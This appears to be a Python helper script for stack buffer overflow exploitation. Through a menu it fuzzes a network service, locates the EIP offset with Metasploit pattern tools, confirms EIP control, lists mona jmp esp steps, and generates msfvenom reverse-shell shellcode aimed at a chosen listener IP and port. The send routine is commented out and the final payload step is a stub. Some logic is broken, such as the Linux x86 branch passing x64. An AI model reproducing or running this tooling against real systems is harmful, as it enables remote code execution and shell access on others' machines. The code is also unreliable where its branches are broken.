#!/usr/bin/python3
import socket
import os

def connection(*userFuzz):
    fuzz = str("")
    for arg in userFuzz:
        fuzz += arg
    print(fuzz)
    #s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #connect=s.connect((host,port))
    #s.send(fuzz + '\r\n')
    #data = s.recv(1024)
    #s.close


def fuzzer():
# create an array of buffers, from 1 to 5900, with increments of 200.
    print("Fuzzing program")
    buffer = ["A"]
    counter = 1
    fuzz = ''
    while len(fuzz) <= 55:
        buffer.append("A"*counter)
        counter=counter+1
        print(buffer)
        for string in buffer:
            fuzz += string
        try:
            print("Fuzzing with %s bytes" % len(fuzz))
            connection(userCmd, fuzz)
        except:
            print("\n\nUse Pattern Offset Locator\n\n")
            #return len(fuzz) THIS WILL BE FOR LIVE PROGRAM!
            break
    return len(fuzz) #REMOVE THIS FOR LIVE PROGRAM!


def PatterOffsetLocator():
# find the EIP location
    try:
        #length = input("What was the fuzzer length? ") ##Here for legacy purposes
        length = str(fuzzLength)
        pattern = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ' + length).read()
        pattern.strip('\n')
        print("The pattern in use is " + pattern)
        connection(userCmd, pattern)
        print("Pattern sent, examine EIP!!")
        eipaddr = str(input("What is the EIP addr pattern? "))
        print(eipaddr)
        offset = os.popen('/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ' + length + ' -q ' + eipaddr).read()
        print("\n\nNext step confirm EIP\n\n")
        print(offset)
        eipOffset = offset.split()[5]
        return eipOffset
    except:
        print("Break")


def confirm():
#Confirm EIP
    try:
        buffer = "A" * int(eipOffset)
        eip = "BBBB"
        padding = "C" * (int(fuzzLength) - 4 - len(buffer))   
        connection(userCmd,str(buffer), str(eip), str(padding))
        print("EIP should be filled with B's with A's before and C's after\n\n")
        print ("""
1. CHECK FOR BAD CHARS
2. USE !mona modules
    A. CHECK FOR ASLR PROTECTIONS
    B. CHECK FOR REBASE
3. CHECK FOR jmp esp instructions
    USE !mona find -s jmp -r esp -m program.dll|exe
    USE !mona find -s "\\xff\\xe4" -m program.dll|exe
C. GET MEMORY LOCATION OF JMP ESP
""")
    except:
        print("break\n\n")




def payload():
    try:
        lhost = input("What is your IP# ")
        lport = input("What is your port# ")
        badchar = input("What are the bad characters# ")
        osType = input("What is the OS (linux or windows)# ")
        selection = input("Input the architecture (86 or 64)# ")
        if osType == "windows":
            if selection == "86":
                arch = "-a x86 -p windows/shell_reverse_tcp"
                payday = os.popen('msfvenom ' + arch + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f python -e x86/shikata_ga_nai -b ' + badchar).read()
            if selection == "64":
                arch = "-a x64 -p windows/x64/shell_reverse_tcp"
                payday = os.popen('msfvenom ' + arch + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f python -e x86/shikata_ga_nai -b ' + badchar).read()
            else:
                print("Invalid architecture")
            return payday
        if osType == "linux":
            if selection == "86":
                arch = "-a x64 -p linux/x86/shell_reverse_tcp"
                payday = os.popen('msfvenom ' + arch + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f python -e x86/shikata_ga_nai -b ' + badchar).read()
            if selection == "64":
                arch = "-a x64 -p linux/x64/shell_reverse_tcp"
                payday = os.popen('msfvenom ' + arch + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f python -e x86/shikata_ga_nai -b ' + badchar).read()
            else:
                print("Invalid architecture")
            return payday
        else:
            print("Invalid OS")
    except:
        print("failed")


def sendpayload():
    '''
    host = ''
port = 
offset = 
eip = ""
#eip = ""
sled = "\x90" * 10
buffer = "\x90" * offset
cmd = "OVFLW"
    connection(cmd + buffer + eip + sled + buf)
'''

host= input("What is the host IP ")
port= int(input("What is the host port "))
userCmd = str(input('What command does the program expect? '))
menu=True
while menu:
    print ("""
1. Fuzz program to crash
2. Find location of EIP
3. Confirm EIP
4. Generate payload
""")
    menuchoice=input("Choose an option# ")
    if menuchoice == "1":
        fuzzLength = fuzzer()
        print(fuzzLength)
    if menuchoice == "2":
        eipOffset = PatterOffsetLocator()
        print(eipOffset)
    if menuchoice == "3":
        confirm()
    if menuchoice == "4":
        payday = payload()
        print(payday)
    if menuchoice == "5":
        sendpayload()

